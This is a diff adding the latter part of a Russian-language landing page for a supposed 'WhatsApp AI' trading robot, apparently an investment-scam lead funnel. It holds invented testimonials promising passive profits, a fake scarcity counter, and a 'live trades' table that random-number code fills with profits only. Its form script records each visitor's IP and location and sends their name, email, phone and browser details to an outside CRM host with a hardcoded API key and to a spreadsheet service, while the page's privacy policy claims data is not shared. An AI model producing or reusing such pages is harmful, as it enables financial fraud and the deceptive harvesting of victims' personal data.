+						<div class="swiper-slide swiper-slide-active" role="group" aria-label="1 / 3" bis_skin_checked="1" style="width: 410px; margin-right: 20px;">
+							<div class="slider-item" bis_skin_checked="1">
+								<div class="slider-item__header" bis_skin_checked="1">
+									<img src="images/Z2APiJ25PQNC.svg" alt="star">
+									<span>05.10.2025</span>
+								</div>
+								<div class="slider-item__main" bis_skin_checked="1" style="background-color: #d8f4cb; border-radius: 10px; ">
+									<h5>Всем рекомендую</h5>
+									<p>
+										Подключил данного бота не так давно и уже доволен своими
+										первыми результатами, за последние 2 недели я оказался в
+										хорошем плюсе 2357 евро. Очень благодарен, что мне сразу
+										позвонили и объяснили, как это все работает, а также помогли
+										подключить торгового бота.
+									</p>
+								</div>
+							</div>
+						</div>
+
+						<!-- Слайд 2 -->
+						<div class="swiper-slide swiper-slide-next" role="group" aria-label="2 / 3" bis_skin_checked="1" style="width: 410px; margin-right: 20px;">
+							<div class="slider-item" bis_skin_checked="1">
+								<div class="slider-item__header" bis_skin_checked="1">
+									<img src="images/pCgcHtXkg5K6.svg" alt="star">
+									<span>04.11.2025</span>
+								</div>
+								<div class="slider-item__main" bis_skin_checked="1" style="background-color: #d8f4cb; border-radius: 10px; ">
+									<h5>
+										Я и поверить не могла как это все просто на самом деле
+									</h5>
+									<p>
+										Такие технологии уже доступны всем, а о них на самом деле
+										знают очень мало людей, еще больше людей скептически к ним
+										относятся, я очень рада что решилась попробовать себя в
+										новой для себя сфере!
+									</p>
+								</div>
+							</div>
+						</div>
+						<div class="swiper-slide" role="group" aria-label="3 / 3" bis_skin_checked="1" style="width: 410px; margin-right: 20px;">
+							<div class="slider-item" bis_skin_checked="1">
+								<div class="slider-item__header" bis_skin_checked="1">
+									<img src="images/emqXRBqTfxYV.svg" alt="star">
+									<span>02.11.2025</span>
+								</div>
+								<div class="slider-item__main" bis_skin_checked="1" style="background-color: #d8f4cb; border-radius: 10px; ">
+									<h5>Я лично проверил</h5>
+									<p>
+										Все реально работает, русскоговорящий менеджер помог мне во
+										всем разобраться. Очень радует что могу совмещать с моей
+										основной работой и получать деньги пока сплю, пока что
+										результаты меня полностью устраивают - рекомендую всем
+										попробовать!
+									</p>
+								</div>
+							</div>
+						</div>
+
+						<!-- Можно добавить ещё слайды ... -->
+					</div>
+					<div class="swiper-arrows" bis_skin_checked="1">
+						<div class="swiper-button-prev swiper-button-disabled" tabindex="-1" role="button" aria-label="Previous slide" aria-controls="swiper-wrapper-ebd948c997fddc02" aria-disabled="true" bis_skin_checked="1"></div>
+						<div class="swiper-button-next" tabindex="0" role="button" aria-label="Next slide" aria-controls="swiper-wrapper-ebd948c997fddc02" aria-disabled="false" bis_skin_checked="1"></div>
+					</div>
+				<span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>
+				<!-- / .swiper -->
+			</div>
+		</section>
+		<footer class="footer">
+    <!-- 1. ДОДАНО КОНТЕЙНЕР ДЛЯ АНІМАЦІЇ -->
+    <div class="whatsapp-animation-bg"></div>
+
+    <!-- 2. Ваш існуючий контент залишається без змін -->
+    <div class="container" bis_skin_checked="1">
+        <div class="footer__content" bis_skin_checked="1">
+            <h2>
+                Начните <br>
+                зарабатывать <br>
+                уже сейчас!
+            </h2>
+            <p>
+                Успейте зарегистрироваться и начать зарабатывать на выгодных
+                инвестициях.
+            </p>
+        </div>
+        <form class="form" id="form" method="post">
+            <input type="hidden" name="phonePrefix" value="">
+            <h3>Форма регистрации</h3>
+
+            <div class="field-wrapper">
+                <div class="field">
+                    <label for="firstName">Имя*</label>
+                    <input type="text" id="firstName" name="firstName" required="">
+                </div>
+
+                <div class="field">
+                    <label for="lastName">Фамилия*</label>
+                    <input type="text" id="lastName" name="lastName" required="">
+                </div>
+
+                <div class="field">
+                    <label for="email">E-mail*</label>
+                    <input type="email" id="email" name="email" required="">
+                </div>
+
+                <div class="field">
+                    <label for="phone">Номер телефона**</label>
+                    <input type="tel" id="phone" name="phone" required="">
+                </div>
+            </div>
+
+            <div class="form-text">
+                * Проект доступен лицам старше 21 года. <br>
+                * Для подтверждения регистрации ответьте на звонок эксперта. <br>
+                * Проект не сотрудничает с гражданами следующих стран: Украина 🇺🇦 / Китай 🇨🇳 / Индия 🇮🇳
+            </div>
+
+            <button type="submit" class="submit"><span>Зарегистрироваться</span></button>
+        </form>
+    </div>
+</footer>
+		<section class="underfooter">
+			<div class="container" bis_skin_checked="1">
+				<div class="underfooter__header" bis_skin_checked="1">
+					<img src="images/ZgDXjGof7hbR.svg" alt="ws">
+				</div>
+				<div class="underfooter__centent" bis_skin_checked="1">
+					<div class="text" bis_skin_checked="1">
+						<span>© 2025 ARCOSS’ARRE. All rights reserved.</span>
+						<a onclick="document.location.hash='form';return false;">Privacy Policy</a>
+					</div>
+					<ul class="soc">
+						<li>
+							<a onclick="document.location.hash='form';return false;"><img src="images/I0Ckz84k7L0r.svg" alt=""></a>
+						</li>
+						<li>
+							<a onclick="document.location.hash='form';return false;"><img src="images/hgf7zjKyS62I.svg" alt=""></a>
+						</li>
+						<li>
+							<a onclick="document.location.hash='form';return false;"><img src="images/odeCly26UD4D.svg" alt=""></a>
+						</li>
+						<li>
+							<a onclick="document.location.hash='form';return false;"><img src="images/bu6EHseXkfQZ.svg" alt=""></a>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</section>
+
+		<!-- Модальное окно -->
+	<div class="modal-lead" id="modalLead" bis_skin_checked="1">
+  <div class="modal-lead__content" bis_skin_checked="1">
+    <!-- Кнопка-крестик -->
+    
+    <button class="close-modal-btn" aria-label="Закрыть модальное окно">
+      <!-- Иконка-крестик (SVG) -->
+       <svg width="40" height="40" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M15.2 4.8C14.8 4.4 14.2 4.4 13.8 4.8L10 8.6L6.2 4.8C5.8 4.4 5.2 4.4 4.8 4.8C4.4 5.2 4.4 5.8 4.8 6.2L8.6 10L4.8 13.8C4.4 14.2 4.4 14.8 4.8 15.2C5.2 15.6 5.8 15.6 6.2 15.2L10 11.4L13.8 15.2C14.2 15.6 14.8 15.6 15.2 15.2C15.6 14.8 15.6 14.2 15.2 13.8L11.4 10L15.2 6.2C15.6 5.8 15.6 5.2 15.2 4.8Z" fill="currentColor"></path>
+  </svg>
+    </button>
+    <div class="modal-lead__content-title" bis_skin_checked="1">ПОЗДРАВЛЯЕМ!🎉</div>
+    <div class="modal-lead__content-subtitle" bis_skin_checked="1">
+     Вам открыт доступ к умному роботу WhatsApp! <br>
+      Вы можете забронировать свое место!
+    </div>
+    <div class="modal-lead__content-banner" bis_skin_checked="1">
+      <div class="modal-lead__content-banner__top" bis_skin_checked="1">
+        <div class="banner__top-title" bis_skin_checked="1">
+          <img src="images/sPJQjqn5d9f6.svg" alt="whatsapp">
+          <span>WHATSAPP AI</span>
+        </div>
+        <div class="banner__top-subtitle" bis_skin_checked="1">FINANCE PLATFORM</div>
+        <div class="banner__top-id" bis_skin_checked="1">
+          ID <span data-banner-id="">45092322</span>
+        </div>
+      </div>
+      <div class="modal-lead__content-banner__description" bis_skin_checked="1">
+        <div class="banner__description-title" bis_skin_checked="1">
+          Пропуск бронирует за вами место в платформе и доступен 24 часа.
+        </div>
+        <div class="banner__description-subtitle" bis_skin_checked="1">
+          После истечения срока действия ваш пропуск будет аннулирован.
+        </div>
+      </div>
+      <div class="modal-lead__content-banner__note" bis_skin_checked="1">
+        <div bis_skin_checked="1"><span id="counter">0</span>/<span>100.000</span></div>
+      </div>
+    </div>
+
+    <div class="modal-lead__content-form fade-in" bis_skin_checked="1">
+      <form class="register-form" id="myForm" name="reg_form" method="post">
+        
+
+        <div class="form-input-main" bis_skin_checked="1">
+          <input type="text" class="form-input" name="firstName" placeholder="Имя" required="" value="">
+        </div>
+
+        <div class="form-input-main" bis_skin_checked="1">
+          <input type="text" class="form-input" name="lastName" placeholder="Фамилия" required="" value="">
+        </div>
+
+        <div class="form-input-main" bis_skin_checked="1">
+          <input name="email" placeholder="Электронная почта" required="" type="email" value="">
+        </div>
+
+        <div class="form-input-main">
+      <input id="phone" type="tel" name="phone" required="">
+    </div>
+
+        <button name="submitBtn" type="submit">Забронировать</button>
+      </form>
+    </div>
+    <div class="modal-lead__content-button" bis_skin_checked="1">
+      <button class="button black-btn">
+        <span>Забрать</span>
+        <span>
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path id="Vector" d="M8.81843 8.50001L5 4.99984L6.09074 4L11 8.50001L6.09074 13L5 12.0001L8.81843 8.50001Z" fill="white"></path>
+          </svg>
+        </span>
+      </button>
+    </div>
+    <div class="modal-lead__content-note" bis_skin_checked="1">
+      Проект доступен лицам старше 21 года. * Для подтверждения регистрации
+      ответьте на звонок эксперта. * Проект не сотрудничает с гражданами
+      следующих стран: Украина / Индия / Китай.
+    </div>
+  </div>
+  <div class="modal-lead__overlay" bis_skin_checked="1"></div>
+</div>
+
+		<script src="js/7hIqu1Jspy0g.js"></script>
+		<script src="js/2SLjzZJJpJoe.js"></script>
+		<script>
+			const swiper = new Swiper('.swiper', {
+				navigation: {
+					nextEl: '.swiper-button-next',
+					prevEl: '.swiper-button-prev',
+				},
+				slidesPerView: 1,
+				spaceBetween: 20,
+				breakpoints: {
+					1024: {
+						slidesPerView: 2,
+					},
+					850: {
+						slidesPerView: 3,
+					},
+					567: {
+						slidesPerView: 2,
+					},
+				},
+			})
+		</script>
+		
+		<script src="js/Zgt7uOTh46sU.js"></script>
+<script>
+	document.addEventListener('DOMContentLoaded', function () {
+		// Выбираем все кнопки, которые открывают модалку
+		const openModalButtons = document.querySelectorAll('.button.black-btn, .cart-button, .open-modal, burger');
+		// Выбираем само модальное окно
+		const modal = document.getElementById('modalLead');
+		// Выбираем оверлей внутри модалки для закрытия
+		const overlay = modal.querySelector('.modal-lead__overlay');
+		// Выбираем кнопку закрытия внутри модалки
+		const closeModalButton = modal.querySelector('.close-modal-btn');
+
+		// Подключаем canvas-confetti
+		const confetti = window.confetti || (() => { console.error('canvas-confetti is not loaded!'); });
+
+		// Функция запуска конфетти
+		function launchConfetti() {
+			// Запуск конфетти с левой стороны
+			confetti({
+				particleCount: 250, // Количество частиц
+				spread: 90,         // Угол разброса
+				startVelocity: 45,  // Начальная скорость
+				scalar: 1.5,        // Размер частиц
+				origin: { x: 0, y: 0.6 }, // Левый край
+				zIndex: 9999        // Высокий z-index
+			});
+
+			// Запуск конфетти с правой стороны
+			confetti({
+				particleCount: 250, // Количество частиц
+				spread: 90,         // Угол разброса
+				startVelocity: 45,  // Начальная скорость
+				scalar: 1.5,        // Размер частиц
+				origin: { x: 1, y: 0.6 }, // Правый край
+				zIndex: 9999        // Высокий z-index
+			});
+		}
+
+		// Функция открытия модалки
+		function openModal() {
+			// Если модалка уже открыта - ничего не делаем
+			if (modal.classList.contains('active')) return;
+			modal.classList.add('active'); // Добавляем класс для отображения модалки
+			document.body.style.overflow = 'hidden'; // Отключаем прокрутку страницы
+			launchConfetti(); // Запускаем конфетти при открытии модалки
+		}
+
+		// Функция закрытия модалки
+		function closeModal() {
+			modal.classList.remove('active'); // Убираем класс, скрывая модалку
+			document.body.style.overflow = ''; // Включаем прокрутку страницы
+		}
+
+		// Обработчики открытия модалки по клику
+		openModalButtons.forEach(button => {
+			button.addEventListener('click', openModal);
+		});
+
+		// Обработчик закрытия модалки при клике на оверлей
+		overlay.addEventListener('click', closeModal);
+
+		// Обработчик закрытия модалки при клике на кнопку закрытия
+		if (closeModalButton) {
+			closeModalButton.addEventListener('click', closeModal);
+		}
+
+		// Закрытие модалки при нажатии на клавишу Escape
+		document.addEventListener('keydown', function (e) {
+			if (e.key === 'Escape' && modal.classList.contains('active')) {
+				closeModal();
+			}
+		});
+
+		// Автоматическое открытие модалки через 20 секунд после загрузки, если она ещё не открыта
+		setTimeout(function () {
+			if (!modal.classList.contains('active')) {
+				openModal();
+			}
+		}, 50000);
+	});
+</script>
+			
+		<script type="text/javascript">
+document.addEventListener('DOMContentLoaded', function () {
+    const defaultCountryCode = '';
+
+    checkIP()
+        .then(result => {
+            setupHiddenInputs(result.ip, result.country_code, result.city);
+            return result;
+        })
+        .then(result => {
+            setupAllPhoneInputs(result.country_code);
+        })
+        .catch(err => {
+            console.log('Error:', err);
+            setupAllPhoneInputs(defaultCountryCode);
+        })
+        .finally(() => {
+            setupAllForms();
+        });
+
+    
+   
+
+    function showUkraineError($input) {
+        const $container = $input.closest('.form-input-main');
+        if ($container.next('.ukraine-error').length === 0) {
+            $container.after('<div class="ukraine-error" style="color: red; font-size: 12px; margin-top: 5px;">Украинские номера не поддерживаются</div>');
+        }
+    }
+
+    function hideUkraineError($input) {
+        $input.closest('.form-input-main').next('.ukraine-error').remove();
+    }
+
+    function validateName(name) {
+        return /^[A-Za-zА-Яа-яЁё\s'-]+$/.test(name.trim());
+    }
+
+    function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email.trim());
+    }
+
+    function isPhoneValid($phoneInput) {
+        if (!$phoneInput || $phoneInput.length === 0) return false;
+        return $phoneInput.intlTelInput('isValidNumber');
+    }
+});
+</script>
+	
+<script>
+  
+document.addEventListener('DOMContentLoaded', function () {
+    const phoneInputs = document.querySelectorAll("input[type='tel']");
+    const formSelector = "form";
+    const itiInstances = new Map();
+    const bannedCountries = ['ua', 'cn', 'in'];
+    let userIP = '127.0.0.1'; 
+
+   
+    function getUserIP(callback) {
+        fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+                userIP = data.ip;
+                callback();
+            })
+            .catch(() => {
+                console.warn('Could not get user IP, using default.');
+                callback();
+            });
+    }
+
+    function isValidEmail(email) {
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailPattern.test(email);
+    }
+
+    function isValidPhone(phone) {
+        const phonePattern = /^\+?\d{7,15}$/;
+        return phonePattern.test(phone);
+    }
+
+    function getUserCountry(callback) {
+        fetch("https://ipapi.co/json/")
+            .then(res => res.json())
+            .then(data => {
+                callback((data?.country || "GB").toLowerCase());
+            })
+            .catch(() => callback("gb"));
+    }
+
+    function initializeInputs(countryCode) {
+        phoneInputs.forEach(input => {
+            const existingIti = input.closest('.iti');
+            if (existingIti) {
+                existingIti.parentNode.insertBefore(input, existingIti);
+                existingIti.remove();
+            }
+
+            const iti = window.intlTelInput(input, {
+                initialCountry: countryCode,
+                separateDialCode: true,
+                onlyCountries: ["hu","al","eg","lu","cy","ro","kr","ca","am","ge", "by", "bg", "lv", "lt", "ee", "md", "rs", "sk", "be", "cz", "dk", "fi", "fr", "de", "it", "is", "ie", "nl", "no", "es", "si", "se", "ch", "pt", "gb", "gr", "cy", "at"],
+                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
+            });
+
+            itiInstances.set(input, iti);
+        });
+    }
+    
+    // Спочатку отримуємо IP, потім країну та ініціалізуємо поля
+    getUserIP(() => {
+        getUserCountry(initializeInputs);
+    });
+
+    document.querySelectorAll(formSelector).forEach(form => {
+        form.addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const firstName = form.querySelector("[name='firstName']")?.value.trim() || "";
+            const lastName = form.querySelector("[name='lastName']")?.value.trim() || "";
+            const email = form.querySelector("[name='email']")?.value.trim() || "";
+            const phoneInput = form.querySelector("input[type='tel']");
+            const iti = itiInstances.get(phoneInput);
+            
+            const countryData = iti?.getSelectedCountryData();
+            const iso2 = countryData?.iso2 || "";
+            const dialCode = countryData?.dialCode || "";
+            const phoneNumber = iti?.getNumber('national').replace(/\s+/g, '') || "";
+            const fullPhone = `+${dialCode}${phoneNumber}`;
+
+            if (bannedCountries.includes(iso2)) {
+                alert("Регистрация из вашей страны недоступна.");
+                return;
+            }
+
+            if (!firstName || !lastName) {
+                alert("Введите имя и фамилию.");
+                return;
+            }
+
+            if (!isValidEmail(email)) {
+                alert("Введите корректный email.");
+                return;
+            }
+
+            if (!isValidPhone(fullPhone)) {
+                alert("Введите корректный номер телефона.");
+                return;
+            }
+
+            const loader = document.getElementById("loadingOverlay");
+            if (loader) loader.style.display = "flex";
+
+            
+            const crmData = {
+                first_name: firstName,
+                last_name: lastName,
+                email: email,
+                phone: phoneNumber,
+                dial_code: dialCode,
+                user_agent: navigator.userAgent,
+                funnel: "WhatsAppMVI", 
+                url: window.location.href,
+                geo: iso2.toUpperCase(),
+                language: 'ru',
+                ip: userIP
+            };
+            
+          
+            const sheetDataPayload = {
+                fullName: `${firstName} ${lastName}`,
+                email: email,
+                countryCode: dialCode,
+                phoneNumber: phoneNumber
+            };
+            
+            const params = new URLSearchParams(window.location.search);
+            const subid = params.get("subid");
+
+            
+            const sendToCrm = fetch("https://zyrovexx.xyz/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "V-Api-Key": "LbhYInWKs75hc1mqiMq-OAkVo2Sfq8AqyfnZ3CNC_T8",
+                    "V-Integration-Id": "V-tcY6KX1NxvG2QckC"
+                },
+                body: JSON.stringify(crmData)
+            }).then(response => response.json());
+
+            // --- Promise для відправки в таблицю ---
+            const sendToSheet = fetch("https://sheetdb.io/api/v1/zprzcklrwac1g", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ data: [sheetDataPayload] })
+            }).then(response => response.json());
+
+            // --- Очікуємо виконання обох запитів ---
+            Promise.all([sendToCrm, sendToSheet])
+                .then(([crmResult, sheetResult]) => {
+                    console.log("CRM Response:", crmResult);
+                    console.log("SheetDB Response:", sheetResult);
+
+                    // Перенаправлення, якщо обидва запити успішні
+                    setTimeout(() => {
+                        window.location.href = './Thanks.php?subid=' + subid;
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error("An error occurred:", error);
+                    alert("Ошибка при отправке.");
+                    if (loader) loader.style.display = "none";
+                });
+        });
+    });
+});
+</script>
+
+
+
+<div id="loadingOverlay" style="display: none;">
+  <div class="loader-bg"></div>
+  <img src="images/Wn4XJICy9Yll.gif" alt="loading" class="loader-gif">
+</div>
+
+
+<script src="js/zTJCyx35eXau.js"></script>
+
+ 
+
+<div id="cookieBanner" style="position: fixed; bottom: 20px; right: 20px; max-width: 320px; width: 90%; background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); font-family: Arial, sans-serif; z-index: 9999; padding: 16px;">
+  <strong style="font-size: 16px;">Уведомление</strong>
+  <p style="font-size: 14px; margin-top: 10px; max-height: 200px; overflow-y: auto;">
+    Мы и отдельные третьи стороны используем файлы cookie или аналогичные технологии для технических целей и с вашего согласия для обеспечения функциональности, опыта, измерения и маркетинга (персонализированные объявления), как указано в
+    <strong>
+      <!-- Ссылки, которые будут открывать модальное окно -->
+      <a href="#" onclick="document.location.hash='';return false;" id="privacyLink" style="color: black; text-decoration: underline; cursor: pointer;">Политике конфиденциальности</a> или
+      <a href="#" onclick="document.location.hash='';return false;" id="termsLink" style="color: black; text-decoration: underline; cursor: pointer;">Условиях предоставления услуг</a>
+    </strong>.
+    Вы можете дать, отклонить или отозвать свое согласие в любое время в панели настроек. Отказ от согласия может привести к недоступности соответствующих функций. Чтобы выразить свое согласие, воспользуйтесь кнопкой «Принять все». Чтобы продолжить работу без согласия...
+  </p>
+  <div style="display: flex; justify-content: space-between; gap: 10px; margin-top: 12px;">
+    <button onclick="closeCookieBanner()" style="flex:1; padding: 8px; background: #111; color: white; border: none; border-radius: 6px; cursor: pointer;">Принять все</button>
+    <button onclick="closeCookieBanner()" style="flex:1; padding: 8px; background: #e5e5e5; color: black; border: none; border-radius: 6px; cursor: pointer;">Отклонить все</button>
+  </div>
+</div>
+
+
+
+<!-- HTML-код модального окна -->
+<div id="privacyModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.6); justify-content: center; align-items: center; z-index: 10000;">
+  <div style="background-color: #fff; padding: 25px; border-radius: 10px; width: 90%; max-width: 600px; max-height: 80vh; overflow-y: auto; position: relative; box-shadow: 0 5px 15px rgba(0,0,0,0.3);">
+    <button id="closePrivacyModal" style="position: absolute; top: 10px; right: 15px; font-size: 28px; font-weight: bold; color: #555; background: none; border: none; cursor: pointer;">�</button>
+    
+    <h2>Политика конфиденциальности</h2>
+    <p><strong>Последнее обновление:  <span id="auto-date"></span></strong></p>
+    <p>Настоящая Политика конфиденциальности описывает, как WhatsApp AI («мы», «нас» или «наш») собирает, использует и защищает вашу личную информацию при использовании нашего веб-сайта.</p>
+    
+    <h4 style="margin-top: 1em; margin-bottom: 0.5em;">1. Информация, которую мы собираем</h4>
+    <p><strong>Информация, предоставляемая вами напрямую:</strong> Имя, адрес электронной почты, номер телефона и любая другая информация, которую вы решите предоставить.</p>
+    <p><strong>Информация, собираемая автоматически:</strong> IP-адрес, тип браузера, операционная система, время посещения, просмотренные страницы.</p>
+    
+    <h4 style="margin-top: 1em; margin-bottom: 0.5em;">2. Как мы используем вашу информацию</h4>
+    <p>Для предоставления и обслуживания Сервиса. Для связи с вами. Для улучшения нашего Сервиса и обеспечения безопасности.</p>
+    
+    <h4 style="margin-top: 1em; margin-bottom: 0.5em;">3. Использование файлов cookie</h4>
+    <p>Мы используем файлы cookie для обеспечения базовой работы сайта, сбора анонимной статистики и запоминания ваших настроек.</p>
+    
+    <h4 style="margin-top: 1em; margin-bottom: 0.5em;">4. Передача данных третьим лицам</h4>
+    <p>Мы не продаем и не передаем вашу личную информацию третьим лицам, за исключением случаев, предусмотренных законом или для работы с нашими поставщиками услуг.</p>
+    
+    <h4 style="margin-top: 1em; margin-bottom: 0.5em;">5. Хранение и защита данных</h4>
+    <p>Мы принимаем серьезные меры для защиты вашей информации, включая шифрование. Однако ни один метод не является на 100% безопасным.</p>
+    
+    <h4 style="margin-top: 1em; margin-bottom: 0.5em;">6. Контактная информация</h4>
+    <p>Если у вас есть вопросы по поводу этой Политики, свяжитесь с нами по электронной почте: support@whatsapp.ai</p>
+  </div>
+</div>
+
+
+<script>
+  const dateElement = document.getElementById('auto-date');
+  if (dateElement) {
+    const today = new Date();
+    const day = String(today.getDate()).padStart(2, '0');
+    const month = String(today.getMonth() + 1).padStart(2, '0'); // Місяці починаються з 0, тому +1
+    const year = today.getFullYear();
+    dateElement.textContent = `${day}.${month}.${year}`;
+  }
+</script>
+
+<!-- JavaScript для управления модальным окном -->
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        // Знаходимо елемент, за яким будемо спостерігати
+        const statsContainer = document.querySelector('.stats-container');
+
+        // Якщо елемент не знайдено, нічого не робимо
+        if (!statsContainer) return;
+
+        // Ця функція запускає анімацію для всіх лічильників
+        const runCounterAnimation = () => {
+            const counters = document.querySelectorAll('.stat-number');
+            const animationDuration = 2000; // Тривалість анімації в мілісекундах
+
+            counters.forEach(counter => {
+                const target = +counter.getAttribute('data-target');
+                // Перевіряємо, чи анімація вже була запущена для цього елемента
+                if (counter.dataset.animated) {
+                    return;
+                }
+                counter.dataset.animated = "true"; // Помічаємо, що анімація почалась
+
+                const isPercentage = counter.textContent.includes('%');
+                const isPositive = counter.textContent.includes('+');
+                const decimalPlaces = (target.toString().split('.')[1] || '').length;
+
+                let startTime = null;
+
+                const animateCount = (timestamp) => {
+                    if (!startTime) startTime = timestamp;
+                    const progress = Math.min((timestamp - startTime) / animationDuration, 1);
+                    const currentValue = progress * target;
+
+                    let displayText = currentValue.toFixed(decimalPlaces);
+
+                    if (isPositive) {
+                        displayText = "+" + displayText;
+                    }
+                    if (isPercentage) {
+                        displayText += "%";
+                    }
+
+                    counter.textContent = displayText;
+
+                    if (progress < 1) {
+                        requestAnimationFrame(animateCount);
+                    } else {
+                        // Забезпечуємо точне кінцеве значення
+                        let finalDisplay = target.toFixed(decimalPlaces);
+                        if(isPositive) finalDisplay = "+" + finalDisplay;
+                        if(isPercentage) finalDisplay += "%";
+                        counter.textContent = finalDisplay;
+                    }
+                };
+                requestAnimationFrame(animateCount);
+            });
+        };
+
+        // Налаштування для Intersection Observer
+        // Анімація запуститься, коли на екрані з'явиться хоча б 10% блоку
+        const observerOptions = {
+            root: null, // спостерігаємо відносно всього вікна браузера
+            rootMargin: '0px',
+            threshold: 0.1 
+        };
+
+        // Створюємо спостерігача
+        const observer = new IntersectionObserver((entries, observer) => {
+            entries.forEach(entry => {
+                // Якщо елемент з'явився у видимій зоні
+                if (entry.isIntersecting) {
+                    // Запускаємо анімацію
+                    runCounterAnimation();
+                    // Припиняємо спостереження за цим елементом, щоб анімація не повторилася
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, observerOptions);
+
+        // Починаємо спостереження за нашим контейнером
+        observer.observe(statsContainer);
+    });
+</script>
+
+
+
+
+
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    // Знаходимо всі картки, які потрібно анімувати
+    const cardsToAnimate = document.querySelectorAll('.section-three__content > li');
+    if (cardsToAnimate.length === 0) {
+        console.warn('Картки для анімації не знайдені.');
+        return;
+    }
+
+    /**
+     * Функція для анімації числа в одному HTML-елементі.
+     * Логіка залишилася такою ж, як і раніше.
+     */
+    const animateNumber = (element) => {
+        if (element.dataset.animated) return;
+        element.dataset.animated = 'true';
+
+        const originalText = element.textContent.trim();
+        const animationDuration = 2000;
+
+        const match = originalText.match(/^(-?[0-9,.]+)(.*)/);
+        if (!match) return;
+
+        const numberString = match[1];
+        const suffix = match[2] || '';
+        
+        let decimalPlaces = 0;
+        if (numberString.includes('.')) {
+            decimalPlaces = numberString.split('.')[1].length;
+        } else if (numberString.includes(',')) {
+            // Виправляємо обробку для чисел з комою як десятковим роздільником
+            const parts = numberString.split(',');
+            if (parts.length > 1) {
+                decimalPlaces = parts[1].length;
+            }
+        }
+
+        const targetValue = parseFloat(numberString.replace(/[,\s]/g, '').replace(',', '.'));
+        if (isNaN(targetValue)) return;
+
+        let startTime = null;
+        const animationStep = (timestamp) => {
+            if (!startTime) startTime = timestamp;
+            
+            const progress = Math.min((timestamp - startTime) / animationDuration, 1);
+            const currentValue = progress * targetValue;
+            
+            // Форматуємо число назад до локального формату (з комою), якщо потрібно
+            let formattedValue = currentValue.toFixed(decimalPlaces);
+            if (originalText.includes(',')) {
+                formattedValue = formattedValue.replace('.', ',');
+            }
+
+            element.textContent = formattedValue + suffix;
+
+            if (progress < 1) {
+                requestAnimationFrame(animationStep);
+            } else {
+                element.textContent = originalText;
+            }
+        };
+        requestAnimationFrame(animationStep);
+    };
+
+    /**
+     * Функція зворотного виклику для Intersection Observer.
+     * Вона спрацьовує, коли картка з'являється на екрані.
+     */
+    const observerCallback = (entries, observer) => {
+        entries.forEach(entry => {
+            // Якщо картка (entry.target) потрапила у видиму зону
+            if (entry.isIntersecting) {
+                // Знаходимо всі елементи з числами ТІЛЬКИ всередині цієї картки
+                const numbersInCard = entry.target.querySelectorAll('.procent, .procent-kof');
+                numbersInCard.forEach(animateNumber);
+                
+                // Припиняємо спостерігати за цією карткою
+                observer.unobserve(entry.target);
+            }
+        });
+    };
+
+    // Налаштування спостерігача
+    const observerOptions = {
+        root: null,
+        // Анімація почнеться, коли буде видно 20% картки.
+        // Можете погратися з цим значенням (від 0.0 до 1.0).
+        threshold: 0.2 
+    };
+
+    // Створюємо спостерігача
+    const observer = new IntersectionObserver(observerCallback, observerOptions);
+
+    // Запускаємо спостереження за кожною карткою
+    cardsToAnimate.forEach(card => {
+        observer.observe(card);
+    });
+});
+</script>
+
+
+
+
+
+
+
+   <script>
+        const tbody = document.querySelector(".table__body");
+
+        const objValues = {
+            direction: ["LONG", "SHORT"],
+            asset: [
+                "GBP/USD", "USD/CAD", "GBP/USD", "USD/CHF", "EUR/JPY",
+                "EUR/USD", "NZD/USD", "USD/EUR", "JPY/USD", "JPY/EUR",
+            ],
+        };
+
+        // Генеруємо початкові 20 рядків
+        for (let i = 0; i < 20; i++) {
+            tbody.insertAdjacentHTML("afterbegin", insertNewRow());
+        }
+
+        // Оновлення таблиці кожні 2.5 секунди
+        setInterval(() => {
+            if (tbody.children.length > 25) {
+                tbody.removeChild(tbody.lastElementChild);
+            }
+            tbody.insertAdjacentHTML("afterbegin", insertNewRow());
+        }, 2500);
+
+        function insertNewRow() {
+            const payment = getRandomSum(150, 1500);
+            const direction = objValues.direction[getRandomNumber(1)];
+            const directionClass = direction === 'LONG' ? 'direction-long' : 'direction-short';
+            return `
+                <tr class="table__body-row">
+                    <td>${objValues.asset[getRandomNumber(objValues.asset.length - 1)]}</td>
+                    <td><span class="status-profit">PROFIT</span></td>
+                    <td><div class="profit-bubble">€${Math.floor(payment * 1.89)}</div></td>
+                    <td class="${directionClass}">${direction}</td>
+                    <td>€${payment}</td>
+                    <td>${formatDate(getPreviousDate(getRandomSum(5, 45)))}</td>
+                    <td>${formatDate(new Date())}</td>
+                </tr>
+            `;
+        }
+
+        function getRandomNumber(num) { return Math.floor(Math.random() * (num + 1)); }
+        function getRandomSum(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        
+       function formatDate(dateObject) {
+    // Функція для додавання нуля спереду, якщо число менше 10
+    const pad = (num) => String(num).padStart(2, '0');
+
+    // Перевіряємо, чи ми отримали правильний об'єкт дати
+    if (!(dateObject instanceof Date) || isNaN(dateObject)) {
+        return "Невірна дата"; // Захист від помилок
+    }
+
+    const year = dateObject.getFullYear();
+    const month = pad(dateObject.getMonth() + 1); // Місяці починаються з 0
+    const day = pad(dateObject.getDate());
+    const hours = pad(dateObject.getHours());
+    const minutes = pad(dateObject.getMinutes());
+    const seconds = pad(dateObject.getSeconds());
+
+    return `${year}/${month}/${day} ${hours}:${minutes}:${seconds}`;
+}
+
+        function getPreviousDate(minutes) {
+            return new Date(Date.now() - minutes * 60000);
+        }
